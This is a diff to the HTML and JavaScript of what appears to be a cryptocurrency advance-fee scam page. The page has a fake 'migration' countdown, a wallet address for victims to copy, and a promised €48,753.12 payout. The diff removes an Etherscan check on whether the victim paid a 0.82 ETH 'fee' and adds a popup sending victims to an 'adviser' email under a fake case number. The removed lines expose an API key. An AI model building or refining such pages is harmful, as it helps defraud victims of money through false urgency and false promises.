@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -135,11 +135,66 @@
         .main-action:hover { background: var(--primary); color: white; transform: translateY(-2px); }
 
         .timer { font-size: 11px; color: var(--accent); margin-top: 15px; font-family: 'JetBrains Mono'; }
+
+        /* MODAL STYLES */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: #111;
+            border: 1px solid var(--primary);
+            padding: 30px;
+            border-radius: 24px;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(0, 112, 243, 0.3);
+        }
+        .modal-content h2 { font-size: 20px; margin-bottom: 10px; color: white; }
+        .modal-content p { font-size: 14px; color: #ccc; margin-bottom: 25px; }
+        .email-link {
+            display: block;
+            background: rgba(0, 112, 243, 0.1);
+            border: 1px dashed var(--primary);
+            color: var(--primary);
+            padding: 15px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-family: 'JetBrains Mono';
+            font-weight: 600;
+            margin-bottom: 20px;
+            transition: 0.3s;
+        }
+        .email-link:hover { background: var(--primary); color: white; }
+        .close-btn {
+            color: #555;
+            font-size: 12px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
 
 <div class="glow"></div>
+
+<!-- Custom Popup Modal -->
+<div class="modal-overlay" id="contactModal">
+    <div class="modal-content">
+        <h2>Financial Adviser Contact</h2>
+        <p>Your case #ETH-7477-X requires manual synchronization. Please contact your assigned adviser directly:</p>
+        <a href="mailto:jolene.simmons@quantiumax.company?subject=Migration Assistance Case #ETH-7477-X" class="email-link">
+            jolene.simmons@quantiumax.company
+        </a>
+        <div class="close-btn" onclick="toggleModal(false)">Dismiss Notification</div>
+    </div>
+</div>
 
 <div class="container">
     <div class="card">
@@ -173,20 +228,15 @@
             <button class="btn-copy" onclick="copyAddress()">COPY GATEWAY ADDRESS</button>
         </div>
 
-        <button class="main-action" onclick="verifyMigration()">Contact your Financial Adviser</button>
+        <button class="main-action" onclick="toggleModal(true)">Contact your Financial Adviser</button>
         
         <div class="timer">MIGRATION WINDOW EXPIRES IN: <span id="timer">--:--:--</span></div>
     </div>
 </div>
 
 <script>
-    const CASE_ID = "#ETH-7477-X";
-    const TARGET_WALLET = "0xd522C894C9323B3006b0ABBfe92257D0726c2663";
-    const FEE = 0.82;
-    const API_KEY = "ATUAJBD9PE7HUBAZY7QHQ4YTZ6VFAGWJMU";
-    const INITIAL_TIME = 1800000; // 500 hours in seconds
+    const INITIAL_TIME = 1800000; 
 
-    // --- LOCAL STORAGE PERSISTENCE ---
     let time;
     const savedTime = localStorage.getItem('migration_timer');
     
@@ -197,27 +247,17 @@
         localStorage.setItem('migration_timer', time);
     }
 
+    function toggleModal(show) {
+        document.getElementById('contactModal').style.display = show ? 'flex' : 'none';
+    }
+
     function copyAddress() {
         const addr = document.getElementById('wallet-addr').innerText;
         navigator.clipboard.writeText(addr);
         alert("Gateway Address Copied to Clipboard");
     }
 
-    async function verifyMigration() {
-        try {
-            const res = await fetch(`https://api.etherscan.io/v2/api?chainid=1&module=account&action=balance&address=${TARGET_WALLET}&tag=latest&apikey=${API_KEY}`);
-            const data = await res.json();
-            const bal = Number(data.result) / 1e18;
-
-            if(bal >= FEE) {
-                alert(`SUCCESS: Settlement verified. Smart Contract ${CASE_ID} has been deployed. Your €48,753.12 will arrive in your wallet within 15-30 minutes.`);
-            } else {
-                alert(`jolene.simmons@quantiumax.company`);
-            }
-        } catch(e) { alert("Execution Error. Please check connectivity."); }
-    }
-
-    // Timer Logic with Persistence
+    // Timer Logic
     setInterval(() => {
         if (time > 0) {
             time--;
